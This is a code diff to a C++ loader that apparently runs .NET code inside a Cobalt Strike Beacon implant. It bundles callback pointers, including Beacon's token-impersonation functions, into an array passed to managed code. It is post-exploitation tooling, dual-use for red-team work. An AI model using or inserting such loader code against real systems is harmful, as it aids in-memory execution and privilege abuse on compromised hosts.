@@ -287,6 +287,36 @@ ICorRuntimeHost* loadCLR(bool v4){
     return result;
 }
 
+VARIANT setupBeaconApiPtrs(){
+
+    BOF_LOCAL(OleAut32, SafeArrayCreate);
+    BOF_LOCAL(OleAut32, SafeArrayPutElement);
+
+    VARIANT vPtrs;
+    SAFEARRAYBOUND sab;
+
+    //Bug in beacon BOF loader prevents intialiser list from properly resolving
+    //function pointers, so we initialise the array the long way
+    long long ptrs[4];
+    ptrs[0] = reinterpret_cast<long long>(logConsole);
+    ptrs[1] = reinterpret_cast<long long>(loadAssemblyInAppDomain);
+    ptrs[2] = reinterpret_cast<long long>(BeaconUseToken);
+    ptrs[3] = reinterpret_cast<long long>(BeaconRevertToken);
+
+    int numElements = sizeof(ptrs)/sizeof(long long);
+
+    sab.lLbound   = 0;
+    sab.cElements = numElements;
+    vPtrs.vt = VT_ARRAY | VT_I8;
+    vPtrs.parray = SafeArrayCreate(VT_I8, 1, &sab);
+
+    for(LONG idx=0; idx<numElements; ++idx){
+        SafeArrayPutElement(vPtrs.parray,&idx, &ptrs[idx]);
+    }
+
+    return vPtrs;
+}
+
 
 extern "C" void go(char* args , int len) {
 
@@ -367,14 +397,7 @@ extern "C" void go(char* args , int len) {
         return;
     }
 
-    VARIANT logCallback;
-    logCallback.vt = VT_I8;
-    logCallback.llVal = reinterpret_cast<long long>(logConsole);
-
-    VARIANT loadAssemblyCallback;
-    loadAssemblyCallback.vt = VT_I8;
-    loadAssemblyCallback.llVal = reinterpret_cast<long long>(loadAssemblyInAppDomain);
-
+    VARIANT vBeaconApis = setupBeaconApiPtrs();
     VARIANT vBofName = createVariantString(bofName);
     int bofNameLen = strlen(bofName) + 1;
     int remainingDataLen = len-(bofNameLen);
@@ -391,7 +414,7 @@ extern "C" void go(char* args , int len) {
             cmdLine.bstrVal = nullptr;
         }
 
-        invokeStaticMethod(bofnetInitalizerType, SysAllocString(L"InvokeBof"), 4, &logCallback, &loadAssemblyCallback, &vBofName, &cmdLine);
+        invokeStaticMethod(bofnetInitalizerType, SysAllocString(L"InvokeBof"), 3, &vBeaconApis, &vBofName, &cmdLine);
 
     }else{
 
@@ -404,7 +427,7 @@ extern "C" void go(char* args , int len) {
         rawData.parray = SafeArrayCreate(VT_UI1, 1, &sab);
         memcpy(rawData.parray->pvData, args+bofNameLen, sab.cElements);
 
-        invokeStaticMethod(bofnetInitalizerType, SysAllocString(L"InvokeBof"), 4, &logCallback, &loadAssemblyCallback, &vBofName, &rawData);
+        invokeStaticMethod(bofnetInitalizerType, SysAllocString(L"InvokeBof"), 3, &vBeaconApis, &vBofName, &rawData);
 
         SafeArrayDestroy(rawData.parray);
     }
